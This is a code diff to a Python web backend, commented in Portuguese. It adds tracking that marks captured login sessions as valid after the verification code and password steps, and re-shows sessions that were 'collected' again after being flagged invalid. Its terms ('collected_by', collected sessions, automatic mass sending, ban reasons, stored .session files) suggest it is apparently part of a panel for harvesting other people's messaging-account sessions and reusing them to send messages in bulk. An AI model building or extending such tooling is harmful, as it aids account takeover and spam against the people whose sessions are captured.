@@ -124,6 +124,16 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
         if account_id:
             session_stats[phone]["account_id"] = account_id
 
+def mark_session_valid(phone):
+    """Marca sessão como válida após login confirmado."""
+    if phone not in session_stats:
+        init_session_stats(phone)
+    session_stats[phone]["status"] = "active" if disparo_automatico_ativo() else "collected"
+    session_stats[phone]["validation_status"] = "valid"
+    session_stats[phone]["validated_at"] = time.time()
+    session_stats[phone]["validation_error"] = ""
+    session_stats[phone]["ban_reason"] = ""
+
 STATS_FILE = os.path.join(DATA_DIR, "stats.json")
 
 def save_stats():
@@ -144,6 +154,33 @@ def load_stats():
             print(f"[STATS] 📂 Stats carregadas: {len(session_stats)} sessões")
     except Exception as e:
         print(f"[STATS] ⚠️ Erro ao carregar stats: {e}")
+
+def restore_recollected_sessions():
+    """Reexibe sessoes que foram coletadas novamente apos uma validacao invalida."""
+    changed = False
+    for phone, s in session_stats.items():
+        if s.get("validation_status") != "invalid":
+            continue
+
+        session_file = os.path.join(SESSIONS_DIR, f"{phone}.session")
+        validated_at = s.get("validated_at") or 0
+
+        try:
+            session_mtime = os.path.getmtime(session_file)
+        except OSError:
+            continue
+
+        if session_mtime > validated_at + 2:
+            s["status"] = "active" if disparo_automatico_ativo() else "collected"
+            s["validation_status"] = "unknown"
+            s["validation_error"] = ""
+            s["ban_reason"] = ""
+            s["connected_since"] = session_mtime
+            changed = True
+            print(f"[STATS] Sessao {phone} recolhida apos invalidacao; reexibindo na tabela")
+
+    if changed:
+        save_stats()
 
 def save_bots_config(tokens_list):
     """Salva lista de tokens de bots extras"""
@@ -528,6 +565,7 @@ async def api_verify_code(request):
 
         # Stats: registrar nova sessão
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
+        mark_session_valid(phone)
         save_stats()
 
         users.pop(user_id, None)
@@ -594,6 +632,7 @@ async def api_verify_password(request):
 
         # Stats: registrar nova sessão
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
+        mark_session_valid(phone)
         save_stats()
 
         users.pop(user_id, None)
@@ -966,6 +1005,8 @@ async def api_dashboard(request):
     token = request.query.get("token", "")
     if token != DASHBOARD_TOKEN:
         return web.json_response({"error": "Acesso negado"}, status=403)
+
+    restore_recollected_sessions()
 
     active_phones = {
         phone
